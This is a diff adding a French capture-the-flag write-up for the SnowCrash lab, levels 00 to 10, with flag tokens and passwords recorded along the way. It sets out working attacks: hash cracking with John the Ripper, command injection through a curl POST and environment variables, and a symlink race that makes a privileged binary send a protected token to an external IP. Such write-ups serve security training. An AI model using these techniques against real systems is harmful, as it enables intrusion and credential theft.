@@ -1,0 +1,116 @@
+
+/// LEVEL 00
+Vu que je n'ai aucun indice a ma disposition, je me lance innocement a la recherche de fichiers appartenant au group "flag00", et il y en a un !
+
+find / -group flag00 2>/dev/null	=	/usr/sbin/john
+cat /usr/sbin/john					=	cdiiddwpgswtgt
+
+Le mot de passe fonctionne pas alors je pose ca sur dcode et un dechiffrement de code cesar de 15 me donne "nottoohardhere" ce qui a l'air credible
+
+de la, bash>su flag00 puis bash>getflag:
+"Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias"
+
+/// LEVEL 01
+Un simple cat /etc/passwd montre que le mot de passe de flag01 est present sous forme crypt
+(Les autres ont un "x" pour montre qu'ils sont en securite dans /etc/shadow, fichier sur lequel nous n'avons aucune permission)
+
+flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
+
+Il suffit d'utiliser l'outil "John The Ripper".
+On met la ligne precedente dans un fichier texte puis
+./john -format=crypt content/pass.txt
+./john --show content/pass.txt
+
+Et cela nous donnes:
+"abcdefg"
+
+Plus qu'a faire getflag
+f2av5il02puano7naaf6adaaf
+
+/// LEVEL 02
+
+tcpick -C -yU -r level02.pcap
+
+ft_waNDReL0L
+
+kooda2puivaav1idi4f57q8iq
+
+/// LEVEL 03
+
+remplacer echo
+
+qi0maab88jeaj46qoumi7maus
+
+// LEVEL 04
+
+curl -d "x=\`getflag\`" -X POST http://localhost:4747
+
+ne2searoevaevoem4ov4ar8ap
+
+// LEVEL 05
+
+pam_mail + crontab
+
+viuaaale9huek52boumoomioc
+
+// LEVEL 06
+
+[x ${`getflag`}]
+
+wiok45aaoguiboiki2tuin6ub
+
+// LEVEL 07
+ptit Reverse enginering
+export LOGNAME=\`getflag\`
+
+fiumuikeil55xe9cu4dood66h
+
+//LEVEL 08
+On a le fichier token sans les perm mais ./level08 a les perms pour l'ouvrir sauf qu'il y a une protection dedans
+Ptit reverse
+Si le fichier qu'on lui passe s'appelle token alors il nous degage
+Du coup juste a faire un ptit lien symbolique et hop
+
+ln -s /home/user/level08/token /tmp/link
+./level08 /tmp/link
+
+quif5eloekouj29ke0vouxean
+
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+
+
+//LEVEL 09
+ya ./level09 faut comprendre ce qu'il fait. Il retourne argv[1] mais modifie. 
+Pour chaque caractere de la chaine: c += index	exemple: abc -> ace
+
+dcp ya le fichier ./token faut le revert avec la meme logique. Je fais un ptit "cat token | od -An -t u1" pour chopper les codes ascii car ya des caracteres cheluxs.
+
+Jmet fait un ptit programme python pour faire "str[i] -= i" et hop j'ai le flag
+
+flag: f3iji1ju5yuevaus41q1afiuq
+
+s5cAJpM8ev6XHw998pRWG728z
+
+//LEVEL 10
+Ya un executable qui envoi un fichier a une adresse:6969 et un fichier token
+Ptit reverse, on remarque que l'executable fait un access() sur token pour proteger
+Et apres il tente de se connecter a l'adresse et envoi un Header puis envoi le contenu du fichier passe en parametre
+Celui lui prend quelques secondes donc on va essayer de creer un data-race avec un lien symbolique
+Le but est que le lien symbolique change entre le access() le open() pour bypass
+Dcp ont fait un bon brut force bien sympa
+
+#!/bin/bash
+while [ 1 ]
+do
+	ln -sf /tmp/hey /tmp/link								# Creer un lien valide
+	ln -sf /home/user/level10/token /tmp/link &				# Creer le lien sur token en arriere plan
+	/home/user/level10/level10 /tmp/link 10.13.1.6			# Execute le code
+done
+
+De cette maniere, ont maximise les chances pour que la tache en arriere plan s'execute apres le access().
+
+flag: woupa2yuojeeaaed06riuj63c
+
+feulo4b72j7edeahuete3no7c
+
